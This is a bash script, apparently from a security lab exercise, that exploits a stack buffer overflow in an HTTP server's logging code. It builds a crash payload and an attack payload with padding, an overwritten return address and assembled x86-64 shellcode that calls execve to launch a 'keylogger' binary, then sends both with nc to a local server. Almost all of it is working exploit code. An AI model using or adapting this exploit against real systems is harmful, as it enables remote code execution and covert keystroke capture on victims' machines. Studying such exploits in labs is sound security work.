#!/bin/bash

# Bash notes:
#  - every literal is a string
#  - $var gets the value of variable 'var'
#  - $((expr)) evaluates the arithmetic expression
#  - "blabla `command` blabla" executes 'command' and substitutes the result inside the string
#  - ${#var} gives the string length of 'var'

# CONFIGS
port=8080
original_rbp=0x7ffff7abf920 # the rbp value before the 'ret' instruction executed 
log_buffer_rbp_offset=0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix=49 # the server already adds 49 bytes at start of the log buffer


# create a temporary directory for intermediate files
mkdir tmp
cd tmp
# wait to copy the keylogger binary to the remote machine (allowed in scenario 1)
echo "Copy the 'keylogger' binary to 'server_data'. Input anything to continue..."
read brol
message_prefix="GET /data.txt HTTP/1.1\r\n"
message_prefix_len=${#message_prefix}


### CREATE THE CRASH PAYLOAD ###
echo -n -e "GET /data.txt HTTP/1.1\r\n" > crash.http 
bound=$(($log_buffer_rbp_offset+8-$log_buffer_prefix-`wc -c < crash.http`)) # extra 8 bytes to account for the caller's rbp
printf "q%.0s" $(seq 1 $bound) >> crash.http # add padding
echo -n ffffffffffffffff | xxd -r -p >> crash.http # add new return address
echo -n -e "\r\n\r\n" >> crash.http


### CREATE THE ATTACK PAYLOAD ###
keylogger="./keylogger"
placeholder="12345678"
keylogger_len=${#keylogger}
placeholder_len=${#placeholder}
# the offset of our injected payload wrt the current 'rsp' after 'ret' (required because of challenge 1)
# details: see stack representation in python version
payload_rsp_offset=0x10+$log_buffer_rbp_offset-$log_buffer_prefix-$message_prefix_len
shell_code="
  BITS 64
  ; setup execve args 
  ; note: when launching a program from a shell, the first command argument to the new process is the command invocation that launched the program
  ; when manually launching a program with execve, you can either:
  ; - follow this "convention", in which case the launched program can access additional command line arguments starting at index 1 (like if it were launched from a shell)
  ; - or you can choose to put something else as first argument and make the launched program aware that the arguments start at index 0!
  lea rdi, [rsp-$(($payload_rsp_offset))] ; ptr to injected "./keylogger"
  lea rsi, [rsp-$(($payload_rsp_offset-$keylogger_len))] ; argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-$(($payload_rsp_offset-$keylogger_len))] ; envp (= argv)
  ; put a NULL ptr in the placeholder
  xor rax, rax
  mov [rdx], rax
  ; perform the execve syscall
  mov al, 59
  syscall
"

# assemble the shell code
echo "$shell_code" > shell_code.txt
nasm shell_code.txt -o shell_code.bin

# build the payload
echo -n -e "GET /data.txt HTTP/1.1\r\n" > sc1_exploit.http 
echo -n "$keylogger$placeholder" >> sc1_exploit.http # add the argument data
cat shell_code.bin >> sc1_exploit.http # add assembled shell code
bound=$(($log_buffer_rbp_offset+8-$log_buffer_prefix-`wc -c < sc1_exploit.http`)) # wc includes the 24 bytes
printf "q%.0s" $(seq 1 $bound) >> sc1_exploit.http # add padding
retaddr=$(($original_rbp-$log_buffer_rbp_offset+$log_buffer_prefix+$message_prefix_len+$keylogger_len+$placeholder_len)) # the new (absolute) return address points to the first byte of the shell code
printf "%x" $retaddr | tac -rs .. | xxd -r -p  >> sc1_exploit.http # add new little endian return address 
echo -n -e "\r\n\r\n" >> sc1_exploit.http


### PERFORM ATTACK ###
nc localhost $port < crash.http # send crash payload
sleep 2 # let the server restart
nc localhost $port < sc1_exploit.http # send attack payload